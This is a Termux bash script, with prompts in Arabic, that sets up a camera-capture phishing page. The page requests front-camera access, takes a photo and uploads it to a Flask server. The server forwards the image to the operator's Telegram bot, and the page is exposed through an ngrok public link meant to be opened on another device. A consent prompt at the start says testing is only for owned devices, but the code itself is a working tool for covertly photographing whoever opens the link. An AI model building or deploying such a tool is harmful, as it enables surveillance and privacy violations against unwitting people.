#!/data/data/com.termux/files/usr/bin/bash
set -e

echo "!! تحذير مهم !!"
echo "هذا الاختبار يجب أن يجرى فقط على أجهزة تملكها أو لديك موافقة صريحة عليها."
read -p "هل الجهازان ملكك وموافق على الاختبار؟ اكتب YES للمتابعة: " CONF
if [ "$CONF" != "YES" ]; then
  echo "إلغاء: لم تؤكد الموافقة."
  exit 1
fi

read -p "ضع BOT_TOKEN (من BotFather): " BOT_TOKEN
read -p "ضع CHAT_ID (رقم المحادثة لتستقبل الصورة): " CHAT_ID
read -p "اختر SECRET لحماية الرابط (مثال mykey123): " SECRET

# أنشئ مجلد المشروع
mkdir -p public

# صفحة الويب (ستفتح الكاميرا وتبعث الصورة للسيرفر)
cat > public/index.html <<'HTML'
<!doctype html>
<html>
<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Capture</title></head>
<body>
  <h3>اطلب إذن الكاميرا للتجربة</h3>
  <div id="status">جاهز</div>
  <video id="v" autoplay playsinline style="width:100%;max-width:420px"></video>
  <canvas id="c" style="display:none"></canvas>
<script>
(async function(){
  const status = document.getElementById('status');
  const video = document.getElementById('v');
  const canvas = document.getElementById('c');
  const params = new URLSearchParams(location.search);
  const key = params.get('key') || '';
  if(!key){ status.innerText='Missing key in URL.'; return; }
  status.innerText='Requesting camera permission...';
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    video.srcObject = stream;
    await new Promise(r=>setTimeout(r,900));
    const w = video.videoWidth || 640, h = video.videoHeight || 480;
    canvas.width = w; canvas.height = h;
    canvas.getContext('2d').drawImage(video,0,0,w,h);
    stream.getTracks().forEach(t=>t.stop());
    status.innerText='Captured. Sending...';
    canvas.toBlob(async function(blob){
      const fd = new FormData();
      fd.append('photo', blob, 'capture.jpg');
      try{
        const r = await fetch('/upload?key='+encodeURIComponent(key), { method:'POST', body: fd });
        const j = await r.json();
        if(j.ok) status.innerText='Sent successfully.';
        else status.innerText='Send failed: '+JSON.stringify(j);
      }catch(e){
        status.innerText='Upload error: '+e.message;
      }
    }, 'image/jpeg', 0.85);
  }catch(e){
    status.innerText='Camera error/permission denied: '+e.message;
  }
})();
</script>
</body>
</html>
HTML

# ملف سيرفر بايثون (Flask) لالتقاط الصورة وإرسالها لتليجرام
cat > server.py <<PY
from flask import Flask, request, send_from_directory, jsonify
import os, io, requests

app = Flask(__name__, static_folder='public', static_url_path='')

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')
SECRET = os.environ.get('SECRET')

@app.route('/')
def index():
    return send_from_directory('public', 'index.html')

@app.route('/upload', methods=['POST'])
def upload():
    key = request.args.get('key') or request.headers.get('X-Secret')
    if not key or key != SECRET:
        return jsonify(ok=False, error='forbidden'), 403
    if 'photo' not in request.files:
        return jsonify(ok=False, error='no file'), 400
    f = request.files['photo']
    buf = io.BytesIO()
    f.save(buf); buf.seek(0)
    files = {'photo': ('capture.jpg', buf, 'image/jpeg')}
    data = {'chat_id': CHAT_ID}
    resp = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
    try:
        jr = resp.json()
    except:
        return jsonify(ok=False, error='telegram error'), 500
    if not jr.get('ok'):
        return jsonify(ok=False, error=jr), 500
    return jsonify(ok=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
PY

echo "تثبيت متطلبات Python (flask, requests)..."
pip install --quiet --no-input flask requests

# تصدير المتغيرات البيئة مؤقتاً
export BOT_TOKEN="${BOT_TOKEN}"
export CHAT_ID="${CHAT_ID}"
export SECRET="${SECRET}"

echo "بدء السيرفر (Flask) على http://127.0.0.1:3000"
# شغل السيرفر في الخلفية
nohup python3 server.py >/dev/null 2>&1 &

sleep 1

# حاول تشغيل ngrok إن وُجد
if [ -x "./ngrok" ]; then
  echo "تشغيل ngrok..."
  nohup ./ngrok http 3000 >/dev/null 2>&1 &
  sleep 2
  # حاول قراءة عنوان النفق من ngrok api المحلية (قد لا يعمل في بعض إصدارات)
  NGURL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; d=sys.stdin.read(); print(json.loads(d)['tunnels'][0]['public_url'] if d else '')" || true)
  if [ -n "$NGURL" ]; then
    echo "رابط عام (ngrok): ${NGURL}/?key=${SECRET}"
    echo "انسخ هذا الرابط وافتحه على الجهاز الثاني."
    exit 0
  else
    echo "ngrok شغّل لكنه لم يُرجع رابط من API المحلي. افتح جلسة Termux اخرى وشغل: ./ngrok http 3000"
    exit 0
  fi
else
  echo "ngrok غير موجود في المجلد الحالي. لديك خياران:"
  echo "1) نزّل ngrok من https://ngrok.com وضع الملف في $(pwd) ثم شغّل السكربت مرة ثانية."
  echo "2) استخدم localtunnel على جهاز آخر أو Replit (شرحت سابقًا)."
  echo "يمكنك الآن فتح http://127.0.0.1:3000/?key=${SECRET} على نفس الجهاز لاختبار الصفحة."
  exit 0
fi
